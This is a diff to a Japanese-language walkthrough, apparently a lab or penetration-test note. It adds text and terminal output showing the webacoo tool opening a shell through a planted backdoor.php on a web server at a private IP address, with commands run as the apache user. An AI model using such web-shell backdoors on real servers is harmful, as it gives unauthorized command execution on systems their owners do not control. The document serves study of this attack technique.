@@ -177,7 +177,7 @@ backdoor.php
 
 ##Cracking
 
-　backdoor.php にアクセス。apache で
+　backdoor.php にアクセス。apache ユーザーでコマンドを実行できるようになる。
 　
 ```
 $ webacoo -t -u http://192.168.yyy.zzz/backdoor.php
@@ -195,5 +195,11 @@ uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:ht
 
 webacoo$ id
 uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:httpd_t:s0
+webacoo$ pwd
+/var/www/html
+webacoo$ ls -lF
+total 8
+-rw-r--r--. 1 root root 576 Aug 23 00:14 backdoor.php
+-rw-r--r--. 1 root root   2 Aug 23 00:18 index.html
 webacoo$
 ```
